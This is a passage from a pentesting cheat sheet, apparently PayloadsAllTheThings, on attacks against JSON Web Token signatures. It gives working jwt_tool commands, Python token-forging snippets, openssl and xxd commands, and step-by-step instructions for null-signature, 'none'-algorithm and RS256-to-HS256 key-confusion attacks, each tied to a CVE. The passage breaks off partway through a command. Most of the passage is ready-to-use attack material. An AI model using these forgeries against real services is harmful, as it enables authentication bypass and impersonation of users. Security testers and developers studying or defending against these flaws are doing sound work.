<!-- source: JSON Web Token/README.md | chunk 2/5 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->


### JWT Signature - Null Signature Attack (CVE-2020-28042)

Send a JWT with HS256 algorithm without a signature like `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`

**Exploit**:

```ps1
python3 jwt_tool.py JWT_HERE -X n
```

**Deconstructed**:

```json
{"alg":"HS256","typ":"JWT"}.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

### JWT Signature - Disclosure of a correct signature (CVE-2019-7644)

Send a JWT with an incorrect signature, the endpoint might respond with an error disclosing the correct one.

- [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
- [CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)

```ps1
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
```

### JWT Signature - None Algorithm (CVE-2015-9235)

JWT supports a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.

None algorithm variants:

- `none`
- `None`
- `NONE`
- `nOnE`

To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you **remove** the signature

Alternatively you can modify an existing JWT (be careful with the expiration time)

- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py [JWT_HERE] -X a
    ```

- Manually editing the JWT

    ```python
    import jwt

    jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
    decodedToken = jwt.decode(jwtToken, verify=False)       

    # decode the token before encoding with type 'None'
    noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

    print(noneEncoded.decode())
    ```

### JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)

If a server’s code is expecting a token with "alg" set to RSA, but receives a token with "alg" set to HMAC, it may inadvertently use the public key as the HMAC symmetric key when verifying the signature.

Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server: `openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`

> The algorithm **HS256** uses the secret key to sign and verify each message.
> The algorithm **RS256** uses the private key to sign the message and uses the public key for authentication.

```python
import jwt
public = open('public.pem', 'r').read()
print public
print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
```

:warning: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version: `pip install pyjwt==0.4.3`.

- Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)

    ```ps1
    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
    ```

- Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    1. Find the public key, usually in `/jwks.json` or `/.well-known/jwks.json`
    2. Load it in the JWT Editor Keys tab, click `New RSA Key`.
    3. . In the dialog, paste the JWK that you obtained earlier: `{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}`
    4. Select the PEM radio button and copy the resulting PEM key.
    5. Go to the Decoder tab and Base64-encode the PEM.
    6. Go back to the JWT Editor Keys tab and generate a `New Symmetric Key` in JWK format.
    7. Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.
    8. Edit the JWT token alg to `HS256` and the data.
    9. Click `Sign` and keep the option: `Don't modify header`

- Manually using the following steps to edit an RS256 JWT token into an HS256
    1. Convert our public key (key.pem) into HEX with this command.

        ```powershell
        $ cat key.pem | xxd -p | tr -d "\\n"
        2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
        ```

    2. Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.

        ```powershell
        $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a

        (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
        ```

    3. Convert signature (Hex to "base64 URL")

        ```powershell
        python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
